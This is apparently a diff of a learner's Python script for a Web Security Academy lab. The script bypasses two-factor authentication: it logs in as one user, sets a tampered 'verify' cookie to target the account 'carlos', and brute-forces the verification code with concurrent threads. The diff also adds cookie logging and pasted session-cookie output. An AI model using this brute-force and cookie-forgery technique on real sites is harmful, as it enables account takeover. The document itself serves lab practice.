@@ -8,10 +8,11 @@ from requests.adapters import HTTPAdapter #用于配置连接池
 import urllib3
 urllib3.disable_warnings()
 
-LAB = "https://0a9800ca042206fe806a3f7600ab0095.web-security-academy.net/"
+LAB = "https://0a98002703d67611806b8a550061001f.web-security-academy.net/"
 WORKERS = 8  # 并发线程数
 
 s = requests.Session(); s.verify = False   #关闭证书校验，否则会出现TLS警告
+
 # 扩大连接池，避免并发时出现 "Connection pool is full" 警告
 retry = Retry(total=3, backoff_factor=0.3,
                 status_forcelist=[429, 502, 503],
@@ -51,10 +52,12 @@ def request_with_retries(method, path, **kwargs):
 # 第一步：用 wiener 的密码通过第一关（只完成第一因子，拿到已登录的 session Cookie）
 r_login = request_with_retries("POST", "login", data={"username": "wiener", "password": "peter"},
                      allow_redirects=False)
+print(r_login.headers)
 # 凭据正确时通常 302 跳转到 /login2；顺带做一次健壮性校验，避免第一步就失败却继续往下跑
 if r_login.status_code not in (200, 302):
     raise SystemExit(f"第一步登录异常，状态码={r_login.status_code}，请检查凭据 / LAB 地址")
-
+    
+#登录成功后响应里收到cookie={'verify':'wiener'}
 # 第二步：带上 verify=carlos 的 Cookie 访问 login2，让服务器为 carlos 生成验证码
 # （verify 走 Cookie，而不是 params）
 request_with_retries("GET", "login2", cookies=VERIFY_COOKIE)
@@ -90,9 +93,11 @@ def try_code(i):
         return
     with counter_lock:
         counter += 1
-        if counter % 50 == 0:
+        if counter % 20 == 0:
             rps = counter / (time.monotonic() - start)
             print(f"{counter}  {rps:.1f} req/s")
+            print(f"[+]s.cookie:{s.cookies}")
+            print(f"[+]r.cookie:{r.cookies}")
 
 
 with ThreadPoolExecutor(max_workers=WORKERS) as ex:
@@ -115,3 +120,14 @@ if result:
     print("carlos 账户页:", r2.text)
 else:
     print("未命中任何验证码")
+
+# ```爆破验证码过程中的cookie:
+# [+]s.cookie:
+# <RequestsCookieJar
+# [
+# <Cookie verify=wiener for 0a98002703d67611806b8a550061001f.web-security-academy.net/>,
+# <Cookie session=7RwHsg3o24ofVyhtv8s3Sr8CQYLupTTj for 0a98002703d67611806b8a550061001f.web-security-academy.net/>
+# ]
+# >
+# [+]r.cookie:<RequestsCookieJar[]>
+# ```
